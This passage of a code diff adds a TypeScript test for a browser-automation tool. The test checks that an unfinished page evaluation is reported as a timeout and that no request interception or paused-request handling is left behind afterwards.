+    transport.onEvaluate = () => {
+      armed = true;
+    };
+    transport.holdCommand = (method) => {
+      if (method !== 'Page.getFrameTree' || !armed) return undefined;
+      reached.resolve();
+      return held.promise;
+    };
+    // The evaluate is not awaited: the script ends while its window is still
+    // opening, and the action reports the operation that did not finish.
+    const outcome = await run(
+      transport,
+      'page.evaluate(() => 1).catch(() => {}); return "done";',
+    ).catch((error: unknown) => error);
+    expect(String(outcome)).toContain('BROWSER_OPERATION_TIMEOUT');
+    await reached.promise;
+    held.resolve();
+    for (let turn = 0; turn < 20; turn += 1) await nextTurn();
+    const intercepting = transport.commands.filter(
+      ({ method, params }) =>
+        method === 'Fetch.enable' && Array.isArray(params.patterns) && params.patterns.length > 0,
+    );
+    expect(intercepting).toEqual([]);
+    // Nothing listens for paused requests either.
+    const sent = transport.commands.length;
+    transport.emitPaused('https://cdn.other.example/app.js', 'GET');
+    await nextTurn();
+    expect(transport.commands.slice(sent)).toEqual([]);
   });
 });
